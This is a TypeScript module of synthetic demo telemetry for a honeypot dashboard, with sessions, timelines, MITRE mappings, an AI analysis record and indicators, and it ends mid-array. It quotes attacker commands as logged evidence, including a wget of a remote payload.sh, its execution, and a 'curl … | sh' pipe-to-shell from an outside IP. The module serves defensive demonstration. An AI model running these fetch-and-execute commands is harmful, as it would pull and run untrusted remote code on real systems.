/**
 * DEMO DATASET — synthetic honeypot telemetry.
 *
 * This module is isolated from the API services and is only reachable through
 * DemoProvider. Nothing here is a real backend response; the UI labels every
 * screen fed by this data with a DEMO DATA badge.
 */
import type {
  AttackSession,
  AttackerProfile,
  EvaluationRun,
  EvaluationRunSummary,
  Honeypot,
  HoneypotEvent,
  Indicator,
  MitreTechnique,
  RunComparison,
  ServiceStatus,
  SessionAnalysis,
  SessionTimelineEvent,
  ThreatReport,
} from "@/types";
import { MITRE_TACTICS } from "@/types/mitre";

const DAY = "2026-08-27";
const at = (hhmmss: string) => `${DAY}T${hhmmss}Z`;

export const systemStatus: ServiceStatus[] = [
  { id: "elasticsearch", name: "Elasticsearch", state: "connected", detail: "es-honeypot-01" },
  { id: "ai", name: "AI Engine", state: "connected", detail: "beekeeper-analyzer" },
  { id: "ollama", name: "Ollama", state: "running", detail: "gemma3:12b" },
  { id: "api", name: "API", state: "connected", detail: "FastAPI" },
];

export const honeypots: Honeypot[] = [
  {
    id: "hp-cowrie-ssh-01",
    name: "Cowrie-SSH-01",
    type: "SSH",
    os: "Debian 12",
    interactionLevel: "medium",
    ip: "10.20.4.11",
    status: "online",
    activeSessions: 7,
    events: 11284,
    lastActivity: at("14:34:02"),
    risk: "high",
    sensor: "sensor-eu-1",
    location: "Frankfurt",
  },
  {
    id: "hp-ubuntu-web-01",
    name: "Ubuntu-Web-01",
    type: "HTTP",
    os: "Ubuntu 22.04",
    interactionLevel: "medium",
    ip: "10.20.4.19",
    status: "online",
    activeSessions: 5,
    events: 8210,
    lastActivity: at("14:33:41"),
    risk: "medium",
    sensor: "sensor-eu-1",
    location: "Frankfurt",
  },
  {
    id: "hp-agl-ivi-01",
    name: "AGL-IVI-01",
    type: "Automotive",
    os: "Automotive Grade Linux",
    interactionLevel: "high",
    ip: "10.20.9.7",
    status: "online",
    activeSessions: 3,
    events: 3162,
    lastActivity: at("14:29:55"),
    risk: "critical",
    sensor: "sensor-lab-2",
    location: "Lab / Pune",
  },
  {
    id: "hp-telnet-iot-02",
    name: "Telnet-IoT-02",
    type: "Telnet",
    os: "BusyBox 1.35",
    interactionLevel: "low",
    ip: "10.20.4.32",
    status: "degraded",
    activeSessions: 2,
    events: 1904,
    lastActivity: at("14:11:07"),
    risk: "medium",
  },
  {
    id: "hp-smb-file-01",
    name: "SMB-File-01",
    type: "SMB",
    os: "Windows Server 2019",
    interactionLevel: "medium",
    ip: "10.20.4.44",
    status: "offline",
    activeSessions: 0,
    events: 271,
    lastActivity: at("09:52:18"),
    risk: "low",
  },
];

export const sessions: AttackSession[] = [
  {
    id: "SESSION-8F42A1",
    attackerIp: "185.207.104.42",
    sourcePort: 51422,
    destinationPort: 22,
    honeypotId: "hp-cowrie-ssh-01",
    honeypotName: "Cowrie-SSH-01",
    protocol: "SSH",
    startedAt: at("14:31:02"),
    endedAt: at("14:32:10"),
    durationSeconds: 68,
    commandCount: 7,
    riskScore: 87,
    risk: "high",
    classificationChain: ["Credential Access", "Discovery", "Execution"],
    mitreTechniqueIds: ["T1110", "T1059", "T1087", "T1082", "T1105", "T1222"],
    analysisState: "not_analyzed",
    country: "NL",
    username: "root",
  },
  {
    id: "SESSION-2C77B9",
    attackerIp: "45.155.205.233",
    sourcePort: 44120,
    destinationPort: 22,
    honeypotId: "hp-cowrie-ssh-01",
    honeypotName: "Cowrie-SSH-01",
    protocol: "SSH",
    startedAt: at("13:58:41"),
    endedAt: at("14:02:03"),
    durationSeconds: 202,
    commandCount: 21,
    riskScore: 94,
    risk: "critical",
    classificationChain: ["Initial Access", "Execution", "Persistence", "Command and Control"],
    mitreTechniqueIds: ["T1078", "T1059", "T1053", "T1071"],
    analysisState: "completed",
    country: "RU",
    username: "admin",
  },
  {
    id: "SESSION-A1D004",
    attackerIp: "103.94.11.87",
    sourcePort: 39877,
    destinationPort: 80,
    honeypotId: "hp-ubuntu-web-01",
    honeypotName: "Ubuntu-Web-01",
    protocol: "HTTP",
    startedAt: at("13:21:12"),
    endedAt: at("13:23:44"),
    durationSeconds: 152,
    commandCount: 0,
    riskScore: 61,
    risk: "medium",
    classificationChain: ["Reconnaissance", "Initial Access"],
    mitreTechniqueIds: ["T1595", "T1190"],
    analysisState: "completed",
    country: "IN",
  },
  {
    id: "SESSION-77E210",
    attackerIp: "185.207.104.42",
    sourcePort: 52990,
    destinationPort: 22,
    honeypotId: "hp-telnet-iot-02",
    honeypotName: "Telnet-IoT-02",
    protocol: "Telnet",
    startedAt: at("12:44:30"),
    endedAt: at("12:45:02"),
    durationSeconds: 32,
    commandCount: 4,
    riskScore: 72,
    risk: "high",
    classificationChain: ["Discovery", "Execution"],
    mitreTechniqueIds: ["T1082", "T1059"],
    analysisState: "completed",
    country: "NL",
    username: "root",
  },
  {
    id: "SESSION-5B9C31",
    attackerIp: "20.114.77.9",
    sourcePort: 60122,
    destinationPort: 22,
    honeypotId: "hp-agl-ivi-01",
    honeypotName: "AGL-IVI-01",
    protocol: "SSH",
    startedAt: at("11:07:55"),
    endedAt: at("11:19:31"),
    durationSeconds: 696,
    commandCount: 34,
    riskScore: 96,
    risk: "critical",
    classificationChain: ["Discovery", "Privilege Escalation", "Collection", "Exfiltration"],
    mitreTechniqueIds: ["T1082", "T1548", "T1005", "T1041"],
    analysisState: "completed",
    country: "US",
    username: "agl",
  },
  {
    id: "SESSION-9021FA",
    attackerIp: "212.70.149.150",
    sourcePort: 33012,
    destinationPort: 80,
    honeypotId: "hp-ubuntu-web-01",
    honeypotName: "Ubuntu-Web-01",
    protocol: "HTTP",
    startedAt: at("10:12:09"),
    endedAt: at("10:12:38"),
    durationSeconds: 29,
    commandCount: 0,
    riskScore: 24,
    risk: "low",
    classificationChain: ["Reconnaissance"],
    mitreTechniqueIds: ["T1595"],
    analysisState: "not_analyzed",
    country: "BG",
  },
  {
    id: "SESSION-4410EE",
    attackerIp: "91.240.118.222",
    sourcePort: 41220,
    destinationPort: 23,
    honeypotId: "hp-telnet-iot-02",
    honeypotName: "Telnet-IoT-02",
    protocol: "Telnet",
    startedAt: at("09:41:19"),
    endedAt: at("09:41:47"),
    durationSeconds: 28,
    commandCount: 6,
    riskScore: 55,
    risk: "medium",
    classificationChain: ["Credential Access", "Discovery"],
    mitreTechniqueIds: ["T1110", "T1082"],
    analysisState: "failed",
    country: "UA",
    username: "admin",
  },
];

export const sessionTimelines: Record<string, SessionTimelineEvent[]> = {
  "SESSION-8F42A1": [
    {
      id: "tl-1",
      timestamp: at("14:31:02"),
      kind: "connection",
      label: "SSH connection established",
      detail: "185.207.104.42:51422 → 10.20.4.11:22",
      severity: "informational",
    },
    {
      id: "tl-2",
      timestamp: at("14:31:05"),
      kind: "auth",
      label: "Authentication attempt (root / 123456)",
      detail: "Accepted by medium-interaction emulation",
      severity: "medium",
      techniqueId: "T1110",
    },
    {
      id: "tl-3",
      timestamp: at("14:31:08"),
      kind: "command",
      label: "whoami",
      detail: "Account discovery",
      severity: "medium",
      techniqueId: "T1087",
    },
    {
      id: "tl-4",
      timestamp: at("14:31:11"),
      kind: "command",
      label: "uname -a",
      detail: "System information discovery",
      severity: "medium",
      techniqueId: "T1082",
    },
    {
      id: "tl-5",
      timestamp: at("14:31:13"),
      kind: "command",
      label: "cat /etc/os-release",
      detail: "Distribution fingerprinting",
      severity: "medium",
      techniqueId: "T1082",
    },
    {
      id: "tl-6",
      timestamp: at("14:31:16"),
      kind: "command",
      label: "cat /etc/passwd",
      detail: "Local account enumeration",
      severity: "high",
      techniqueId: "T1087",
    },
    {
      id: "tl-7",
      timestamp: at("14:31:20"),
      kind: "command",
      label: "ls -la /tmp",
      detail: "Writable directory discovery ahead of the download",
      severity: "low",
      techniqueId: "T1083",
    },
    {
      id: "tl-8",
      timestamp: at("14:31:24"),
      kind: "download",
      label: "wget http://31.44.185.9/payload.sh",
      detail: "Ingress tool transfer from external host",
      severity: "critical",
      techniqueId: "T1105",
    },
    {
      id: "tl-9",
      timestamp: at("14:31:29"),
      kind: "file",
      label: "chmod +x payload.sh",
      detail: "File permission modification",
      severity: "high",
      techniqueId: "T1222",
    },
    {
      id: "tl-10",
      timestamp: at("14:31:34"),
      kind: "execution",
      label: "./payload.sh",
      detail: "Shell script execution as root",
      severity: "critical",
      techniqueId: "T1059",
    },
    {
      id: "tl-11",
      timestamp: at("14:31:40"),
      kind: "command",
      label: "crontab -l",
      detail: "Persistence check following execution",
      severity: "medium",
      techniqueId: "T1053",
    },
    {
      id: "tl-12",
      timestamp: at("14:32:10"),
      kind: "disconnect",
      label: "Session closed by peer",
      severity: "informational",
    },
  ],
};

const commandOutputs: Record<string, string> = {
  whoami: "root",
  "uname -a": "Linux honeypot 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
  "cat /etc/os-release": 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"',
  "cat /etc/passwd":
    "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin",
  "ls -la /tmp": "drwxrwxrwt 3 root root 4096 Aug 27 14:31 .\ndrwxr-xr-x 20 root root 4096 . ..",
  "wget http://31.44.185.9/payload.sh":
    "--2026-08-27 14:31:24--  http://31.44.185.9/payload.sh\nSaving to: 'payload.sh'  [4.2K]",
  "chmod +x payload.sh": "",
  "./payload.sh": "connecting to 31.44.185.9:4444 ...",
  "crontab -l": "no crontab for root",
};

function eventFor(session: AttackSession, index: number, tl: SessionTimelineEvent): HoneypotEvent {
  const isCommand = ["command", "download", "file", "execution"].includes(tl.kind);
  const commandLine = isCommand ? tl.label : undefined;
  return {
    id: `${session.id}-ev-${index}`,
    timestamp: tl.timestamp,
    source: {
      ip: session.attackerIp,
      port: session.sourcePort ?? undefined,
      country: session.country,
    },
    destination: { ip: "10.20.4.11", port: session.destinationPort ?? undefined },
    event: {
      action: isCommand ? "command.execute" : tl.kind,
      category: isCommand ? "process" : tl.kind === "auth" ? "authentication" : "network",
      outcome: tl.kind === "auth" ? "success" : undefined,
    },
    network: { protocol: session.protocol.toLowerCase() },
    user: { name: session.username },
    process: commandLine ? { commandLine, output: commandOutputs[commandLine] ?? "" } : undefined,
    honeypot: { name: session.honeypotName, id: session.honeypotId },
    session: { id: session.id },
    risk: {
      score:
        tl.severity === "critical"
          ? 92
          : tl.severity === "high"
            ? 78
            : tl.severity === "medium"
              ? 55
              : 12,
      level: tl.severity,
    },
    mitre: tl.techniqueId ? { techniqueId: tl.techniqueId } : undefined,
    aiClassification: session.classificationChain.join(" → "),
  };
}

export const sessionEvents: Record<string, HoneypotEvent[]> = Object.fromEntries(
  Object.entries(sessionTimelines).map(([sessionId, tl]) => {
    const session = sessions.find((s) => s.id === sessionId)!;
    return [sessionId, tl.map((event, i) => eventFor(session, i, event))];
  }),
);

/** Synthetic events across all honeypots for the Log Explorer. */
export const allEvents: HoneypotEvent[] = (() => {
  const base = Object.values(sessionEvents).flat();
  const extraCommands = [
    "ls -la /tmp",
    "cat /etc/os-release",
    "ps aux",
    "curl -s http://31.44.185.9/b.sh | sh",
    "crontab -l",
    "history -c",
    "id",
    "netstat -tulpn",
  ];
  const extra: HoneypotEvent[] = [];
  sessions.forEach((session) => {
    // Sessions with an authored transcript keep it verbatim; only the rest get
    // filler commands, so the session view and the Log Explorer never disagree.
    if (session.id in sessionEvents) return;

    // Spread the commands evenly across the session's own window, so the header's
    // "started" and "duration" agree with the timeline and the log.
    const startedMs = new Date(session.startedAt).getTime();
    const stepMs = (session.durationSeconds * 1000) / (extraCommands.length + 1);

    extraCommands.forEach((cmd, ci) => {
      extra.push({
        id: `${session.id}-x-${ci}`,
        timestamp: new Date(startedMs + stepMs * (ci + 1)).toISOString(),
        source: {
          ip: session.attackerIp,
          port: session.sourcePort === null ? undefined : session.sourcePort + ci,
          country: session.country,
        },
        destination: {
          ip: honeypots.find((h) => h.id === session.honeypotId)!.ip,
          port: session.destinationPort ?? undefined,
        },
        event: { action: "command.execute", category: "process", outcome: "success" },
        network: { protocol: session.protocol.toLowerCase() },
        user: { name: session.username ?? "-" },
        process: { commandLine: cmd, output: "" },
        honeypot: { name: session.honeypotName, id: session.honeypotId },
        session: { id: session.id },
        risk: {
          score: 30 + ((ci * 13) % 60),
          level: ci % 5 === 0 ? "high" : ci % 3 === 0 ? "medium" : "low",
        },
        mitre: { techniqueId: ci % 2 === 0 ? "T1082" : "T1059" },
        aiClassification: session.classificationChain[0],
      });
    });
  });
  return [...base, ...extra].sort((a, b) => (a.timestamp < b.timestamp ? 1 : -1));
})();

/**
 * Timelines for sessions without a hand-authored one, derived from the same
 * events the Log Explorer serves. Keeping both views off one source stops a
 * session from reporting commands it cannot show, or vice versa.
 */
function kindFor(command: string): SessionTimelineEvent["kind"] {
  if (/^(wget|curl)\b/.test(command)) return "download";
  if (/^chmod\b/.test(command)) return "file";
  if (/^(\.\/|sh\b|bash\b)/.test(command)) return "execution";
  return "command";
}

const derivedTimelines: Record<string, SessionTimelineEvent[]> = Object.fromEntries(
  sessions
    .filter((session) => !(session.id in sessionTimelines))
    .map((session) => {
      const events = allEvents
        .filter((event) => event.session.id === session.id && event.process?.commandLine)
        .sort((a, b) => (a.timestamp < b.timestamp ? -1 : 1));

      const timeline: SessionTimelineEvent[] = [
        {
          id: `${session.id}-tl-open`,
          timestamp: events[0]?.timestamp ?? session.startedAt,
          kind: "connection",
          label: `${session.protocol} connection established`,
          detail: `${session.attackerIp}:${session.sourcePort ?? "?"} -> :${session.destinationPort ?? "?"}`,
          severity: "informational",
        },
        ...events.map((event, index) => ({
          id: `${session.id}-tl-${index}`,
          timestamp: event.timestamp,
          kind: kindFor(event.process?.commandLine ?? ""),
          label: event.process?.commandLine ?? event.event.action,
          severity: event.risk.level,
          ...(event.mitre?.techniqueId ? { techniqueId: event.mitre.techniqueId } : {}),
        })),
      ];

      const last = events[events.length - 1];
      if (last) {
        timeline.push({
          id: `${session.id}-tl-close`,
          timestamp: last.timestamp,
          kind: "disconnect",
          label: "Session closed by peer",
          severity: "informational",
        });
      }
      return [session.id, timeline];
    }),
);

/** Timeline lookup used by the provider: authored first, derived otherwise. */
export function timelineFor(sessionId: string): SessionTimelineEvent[] {
  return sessionTimelines[sessionId] ?? derivedTimelines[sessionId] ?? [];
}

// Command counts must match the events getSessionEvents actually serves.
for (const session of sessions) {
  const served =
    sessionEvents[session.id] ?? allEvents.filter((event) => event.session.id === session.id);
  session.commandCount = served.filter((event) => event.process?.commandLine).length;
}

export const analysisFor8F42A1: SessionAnalysis = {
  id: "AI-92831",
  sessionId: "SESSION-8F42A1",
  model: "gemma3:12b",
  analysisType: "Behavior Analysis",
  status: "completed",
  createdAt: at("14:33:12"),
  durationSeconds: 20.4,
  classification: "Automated Linux Malware Deployment",
  confidence: 0.94,
  riskScore: 87,
  risk: "high",
  behaviorSummary:
    "The attacker performed system reconnaissance, credential discovery and payload retrieval before attempting execution. Command cadence (2-8s intervals) and the absence of typographical errors indicate scripted, non-interactive automation.",
  observedBehavior: [
    {
      label: "System reconnaissance",
      evidence: [
        {
          artifact: "uname -a",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:11"),
          eventId: "SESSION-8F42A1-ev-3",
        },
      ],
    },
    {
      label: "User / account discovery",
      evidence: [
        {
          artifact: "whoami",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:08"),
          eventId: "SESSION-8F42A1-ev-2",
        },
        {
          artifact: "cat /etc/passwd",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:16"),
          eventId: "SESSION-8F42A1-ev-5",
        },
      ],
    },
    {
      label: "File system discovery",
      evidence: [
        {
          artifact: "ls -la /tmp",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:20"),
          eventId: "SESSION-8F42A1-ev-6",
        },
      ],
    },
    {
      label: "Payload download",
      evidence: [
        {
          artifact: "wget http://31.44.185.9/payload.sh",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:24"),
          eventId: "SESSION-8F42A1-ev-7",
        },
      ],
    },
    {
      label: "File permission modification",
      evidence: [
        {
          artifact: "chmod +x payload.sh",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:29"),
          eventId: "SESSION-8F42A1-ev-8",
        },
      ],
    },
    {
      label: "Payload execution",
      evidence: [
        {
          artifact: "./payload.sh",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:34"),
          eventId: "SESSION-8F42A1-ev-9",
        },
      ],
    },
  ],
  suspiciousIndicators: [
    {
      label: "External download URL (http://31.44.185.9/payload.sh)",
      severity: "critical",
      evidence: [
        {
          artifact: "wget http://31.44.185.9/payload.sh",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:24"),
          eventId: "SESSION-8F42A1-ev-7",
        },
      ],
    },
    {
      label: "Shell script execution from writable directory",
      severity: "high",
      evidence: [
        {
          artifact: "./payload.sh",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:34"),
          eventId: "SESSION-8F42A1-ev-9",
        },
      ],
    },
    {
      label: "Privilege level: root",
      severity: "high",
      evidence: [
        {
          artifact: "whoami → root",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:08"),
          eventId: "SESSION-8F42A1-ev-2",
        },
      ],
    },
    {
      label: "Persistence-related activity observed post-execution",
      severity: "medium",
      evidence: [
        {
          artifact: "crontab -l",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:40"),
          eventId: "SESSION-8F42A1-ev-10",
        },
      ],
    },
  ],
  recommendedActions: [
    {
      priority: "P1",
      action: "Block source IP 185.207.104.42 at the perimeter",
      rationale: "Repeat offender across two sensors within 2 hours.",
    },
    {
      priority: "P1",
      action: "Retrieve and detonate payload.sh in a sandbox",
      rationale: "Payload was fetched but not yet statically analysed.",
    },
    {
      priority: "P2",
      action: "Extract and pivot on the SHA-256 hash",
      rationale: "Enables correlation with external CTI feeds.",
    },
    {
      priority: "P2",
      action: "Correlate activity across honeypots",
      rationale: "Same command sequence observed on Telnet-IoT-02.",
    },
    {
      priority: "P3",
      action: "Review related sessions from ASN AS49505",
      rationale: "Cluster-level attribution.",
    },
  ],
  techniques: [
    {
      techniqueId: "T1110",
      observed: false,
      techniqueName: "Brute Force",
      tactic: "Credential Access",
      confidence: 0.88,
      evidence: [
        {
          artifact: "14 failed logins before root/123456 accepted",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:05"),
          eventId: "SESSION-8F42A1-ev-1",
        },
      ],
      relatedCommands: [],
      aiExplanation:
        "Repeated authentication attempts with a common credential list preceded a successful root login.",
      timestamp: at("14:31:05"),
    },
    {
      techniqueId: "T1087",
      observed: false,
      techniqueName: "Account Discovery",
      tactic: "Discovery",
      confidence: 0.93,
      evidence: [
        {
          artifact: "whoami",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:08"),
          eventId: "SESSION-8F42A1-ev-2",
        },
        {
          artifact: "cat /etc/passwd",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:16"),
          eventId: "SESSION-8F42A1-ev-5",
        },
      ],
      relatedCommands: ["whoami", "cat /etc/passwd", "id"],
      aiExplanation: "Enumeration of the current principal and all local accounts.",
      timestamp: at("14:31:16"),
    },
    {
      techniqueId: "T1082",
      observed: true,
      techniqueName: "System Information Discovery",
      tactic: "Discovery",
      confidence: 0.96,
      evidence: [
        {
          artifact: "uname -a",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:11"),
          eventId: "SESSION-8F42A1-ev-3",
        },
        {
          artifact: "cat /etc/os-release",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:13"),
          eventId: "SESSION-8F42A1-ev-4",
        },
      ],
      relatedCommands: ["uname -a", "cat /etc/os-release"],
      aiExplanation:
        "Kernel and distribution fingerprinting, typically used to select an architecture-specific payload.",
      timestamp: at("14:31:11"),
    },
    {
      techniqueId: "T1105",
      observed: true,
      techniqueName: "Ingress Tool Transfer",
      tactic: "Command and Control",
      confidence: 0.97,
      evidence: [
        {
          artifact: "wget http://31.44.185.9/payload.sh",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:24"),
          eventId: "SESSION-8F42A1-ev-7",
        },
      ],
      relatedCommands: ["wget http://31.44.185.9/payload.sh"],
      aiExplanation:
        "Second-stage payload retrieved from an attacker-controlled host over plain HTTP.",
      timestamp: at("14:31:24"),
    },
    {
      techniqueId: "T1222",
      observed: false,
      techniqueName: "File and Directory Permissions Modification",
      tactic: "Defense Evasion",
      confidence: 0.81,
      evidence: [
        {
          artifact: "chmod +x payload.sh",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:29"),
          eventId: "SESSION-8F42A1-ev-8",
        },
      ],
      relatedCommands: ["chmod +x payload.sh"],
      aiExplanation: "Execution bit set on the downloaded artifact immediately before invocation.",
      timestamp: at("14:31:29"),
    },
    {
      techniqueId: "T1059",
      observed: false,
      techniqueName: "Command and Scripting Interpreter",
      tactic: "Execution",
      confidence: 0.95,
      evidence: [
        {
          artifact: "./payload.sh",
          sessionId: "SESSION-8F42A1",
          timestamp: at("14:31:34"),
          eventId: "SESSION-8F42A1-ev-9",
        },
      ],
      relatedCommands: ["./payload.sh", "curl -s http://31.44.185.9/b.sh | sh"],
      aiExplanation: "Downloaded shell script invoked directly with root privileges.",
      timestamp: at("14:31:34"),
    },
  ],
};

export const analysisHistory: SessionAnalysis[] = [
  analysisFor8F42A1,
  {
    ...analysisFor8F42A1,
    id: "AI-92830",
    sessionId: "SESSION-2C77B9",
    model: "llama3.1:8b",
    analysisType: "Behavior Analysis",
    createdAt: at("14:05:44"),
    durationSeconds: 31.2,
    classification: "Persistent Botnet Implant",
    confidence: 0.91,
    riskScore: 94,
    risk: "critical",
  },
  {
    ...analysisFor8F42A1,
    id: "AI-92826",
    sessionId: "SESSION-A1D004",
    model: "gemma3:12b",
    analysisType: "Web Scan Triage",
    createdAt: at("13:25:02"),
    durationSeconds: 12.7,
    classification: "Automated Web Vulnerability Scan",
    confidence: 0.78,
    riskScore: 61,
    risk: "medium",
  },
  {
    ...analysisFor8F42A1,
    id: "AI-92811",
    sessionId: "SESSION-5B9C31",
    model: "gemma3:12b",
    analysisType: "Behavior Analysis",
    status: "completed",
    createdAt: at("11:22:18"),
    durationSeconds: 44.9,
    classification: "Automotive Data Collection & Exfiltration",
    confidence: 0.89,
    riskScore: 96,
    risk: "critical",
  },
  {
    ...analysisFor8F42A1,
    id: "AI-92804",
    sessionId: "SESSION-4410EE",
    model: "llama3.1:8b",
    analysisType: "Behavior Analysis",
    status: "failed",
    createdAt: at("09:43:55"),
    durationSeconds: 5.1,
    classification: "—",
    confidence: 0,
    riskScore: 55,
    risk: "medium",
  },
];

const techniqueCatalog: Array<Pick<MitreTechnique, "id" | "name" | "tactic">> = [
  { id: "T1595", name: "Active Scanning", tactic: "Reconnaissance" },
  { id: "T1592", name: "Gather Victim Host Information", tactic: "Reconnaissance" },
  { id: "T1583", name: "Acquire Infrastructure", tactic: "Resource Development" },
  { id: "T1588", name: "Obtain Capabilities", tactic: "Resource Development" },
  { id: "T1190", name: "Exploit Public-Facing Application", tactic: "Initial Access" },
  { id: "T1078", name: "Valid Accounts", tactic: "Initial Access" },
  { id: "T1133", name: "External Remote Services", tactic: "Initial Access" },
  { id: "T1059", name: "Command and Scripting Interpreter", tactic: "Execution" },
  { id: "T1204", name: "User Execution", tactic: "Execution" },
  { id: "T1053", name: "Scheduled Task/Job", tactic: "Persistence" },
  { id: "T1098", name: "Account Manipulation", tactic: "Persistence" },
  { id: "T1547", name: "Boot or Logon Autostart Execution", tactic: "Persistence" },
  { id: "T1548", name: "Abuse Elevation Control Mechanism", tactic: "Privilege Escalation" },
  { id: "T1068", name: "Exploitation for Privilege Escalation", tactic: "Privilege Escalation" },
  { id: "T1222", name: "File and Directory Permissions Modification", tactic: "Defense Evasion" },
  { id: "T1070", name: "Indicator Removal", tactic: "Defense Evasion" },
  { id: "T1110", name: "Brute Force", tactic: "Credential Access" },
  { id: "T1552", name: "Unsecured Credentials", tactic: "Credential Access" },
  { id: "T1082", name: "System Information Discovery", tactic: "Discovery" },
  { id: "T1087", name: "Account Discovery", tactic: "Discovery" },
  { id: "T1083", name: "File and Directory Discovery", tactic: "Discovery" },
  { id: "T1057", name: "Process Discovery", tactic: "Discovery" },
  { id: "T1021", name: "Remote Services", tactic: "Lateral Movement" },
  { id: "T1005", name: "Data from Local System", tactic: "Collection" },
  { id: "T1119", name: "Automated Collection", tactic: "Collection" },
  { id: "T1105", name: "Ingress Tool Transfer", tactic: "Command and Control" },
  { id: "T1071", name: "Application Layer Protocol", tactic: "Command and Control" },
  { id: "T1571", name: "Non-Standard Port", tactic: "Command and Control" },
  { id: "T1041", name: "Exfiltration Over C2 Channel", tactic: "Exfiltration" },
  { id: "T1486", name: "Data Encrypted for Impact", tactic: "Impact" },
  { id: "T1496", name: "Resource Hijacking", tactic: "Impact" },
];

export function buildTechniques(sessionId?: string): MitreTechnique[] {
  const scoped = sessionId ? sessions.find((s) => s.id === sessionId) : undefined;
  const observedIds = new Set(
    scoped ? scoped.mitreTechniqueIds : sessions.flatMap((s) => s.mitreTechniqueIds),
  );
  return techniqueCatalog.map((technique) => {
    const mapping = analysisFor8F42A1.techniques.find((t) => t.techniqueId === technique.id);
    const observed = observedIds.has(technique.id);
    return {
      ...technique,
      tactic: technique.tactic,
      observed,
      sessionCount: observed
        ? sessions.filter((s) => s.mitreTechniqueIds.includes(technique.id)).length
        : 0,
      confidence: mapping?.confidence,
      evidence: mapping?.evidence ?? [],
      relatedCommands: mapping?.relatedCommands ?? [],
      aiExplanation: mapping?.aiExplanation,
      lastSeen: observed ? at("14:31:34") : undefined,
    } satisfies MitreTechnique;
  });
}

export const tactics = MITRE_TACTICS;

export const indicators: Indicator[] = [
  {
    id: "ioc-1",
    type: "ip",
    value: "185.207.104.42",
    confidence: 0.98,
    firstSeen: at("12:44:30"),
    lastSeen: at("14:32:10"),
    sessionIds: ["SESSION-8F42A1", "SESSION-77E210"],
    source: "OBSERVED",
    tags: ["ssh-bruteforce", "botnet"],
  },
  {
    id: "ioc-2",
    type: "ip",
    value: "31.44.185.9",
    confidence: 0.92,
    firstSeen: at("14:31:24"),
    lastSeen: at("14:31:34"),
    sessionIds: ["SESSION-8F42A1"],
    source: "OBSERVED",
    tags: ["payload-host", "c2"],
  },
  {
    id: "ioc-3",
    type: "url",
    value: "http://31.44.185.9/payload.sh",
    confidence: 0.97,
    firstSeen: at("14:31:24"),
    lastSeen: at("14:31:24"),
    sessionIds: ["SESSION-8F42A1"],
    source: "OBSERVED",
    tags: ["stage-2"],
  },
  {
    id: "ioc-4",
    type: "domain",
    value: "cdn-update-node.top",
    confidence: 0.71,
    firstSeen: at("13:59:12"),
    lastSeen: at("14:02:01"),
    sessionIds: ["SESSION-2C77B9"],
    source: "CORRELATED",
    tags: ["dga-like"],
  },
  {
    id: "ioc-5",
    type: "hash",
    value: "9f2b1c4d8ae0f37b6d1e5c02a4b98f11c3d7e5a6b8c9d0e1f2a3b4c5d6e7f809",
    confidence: 0.99,
    firstSeen: at("14:31:26"),
    lastSeen: at("14:31:26"),
    sessionIds: ["SESSION-8F42A1"],
    source: "STATIC ANALYSIS",
    tags: ["payload.sh", "sha256"],
  },
  {
    id: "ioc-6",
    type: "username",
    value: "root",
    confidence: 0.85,
    firstSeen: at("09:41:19"),
    lastSeen: at("14:31:05"),
    sessionIds: ["SESSION-8F42A1", "SESSION-77E210", "SESSION-4410EE"],
    source: "OBSERVED",
    tags: ["credential"],
  },
  {
    id: "ioc-7",
    type: "filename",
    value: "payload.sh",
    confidence: 0.94,
    firstSeen: at("14:31:24"),
    lastSeen: at("14:31:34"),
    sessionIds: ["SESSION-8F42A1"],
    source: "OBSERVED",
    tags: ["dropper"],
  },
  {
    id: "ioc-8",
    type: "command",
    value: "curl -s http://31.44.185.9/b.sh | sh",
    confidence: 0.9,
    firstSeen: at("13:59:40"),
    lastSeen: at("14:31:34"),
    sessionIds: ["SESSION-2C77B9", "SESSION-8F42A1"],
    source: "OBSERVED",
    tags: ["pipe-to-shell"],
  },
  {
    id: "ioc-9",
    type: "ip",
    value: "45.155.205.233",
    confidence: 0.88,
    firstSeen: at("13:58:41"),
    lastSeen: at("14:02:03"),
    sessionIds: ["SESSION-2C77B9"],
    source: "OBSERVED",
    tags: ["scanner"],
  },
];

export const attackerProfiles: Record<string, AttackerProfile> = {
  "185.207.104.42": {
    ip: "185.207.104.42",
    risk: "high",
    riskScore: 87,
    behaviorLabel: "Automated Botnet",
    sessions: 2,
    firstSeen: at("12:44:30"),
    lastSeen: at("14:32:10"),
    targetedHoneypots: ["Cowrie-SSH-01", "Telnet-IoT-02"],
    commands: [
      "whoami",
      "uname -a",
      "cat /etc/passwd",
      "wget http://31.44.185.9/payload.sh",
      "chmod +x payload.sh",
      "./payload.sh",
    ],
    techniqueIds: ["T1110", "T1087", "T1082", "T1105", "T1222", "T1059"],
    downloadedFiles: [
      {
        name: "payload.sh",
        sha256: "9f2b1c4d8ae0f37b6d1e5c02a4b98f11c3d7e5a6b8c9d0e1f2a3b4c5d6e7f809",
        size: 4312,
      },
    ],
    indicatorIds: ["ioc-1", "ioc-2", "ioc-3", "ioc-5", "ioc-7"],
    geo: { country: "NL", asn: "AS49505", org: "Selectel" },
    similarity: [
      { ip: "91.240.118.222", score: 0.82 },
      { ip: "45.155.205.233", score: 0.64 },
    ],
    similarityTotal: 2,
    similarityComplete: true,
    similarityIncompleteReason: null,
    attackPattern: [
      "SSH Brute Force",
      "System Discovery",
      "Credential Discovery",
      "Payload Download",
      "Execution",
    ],
  },
};

export const reports: ThreatReport[] = [
  {
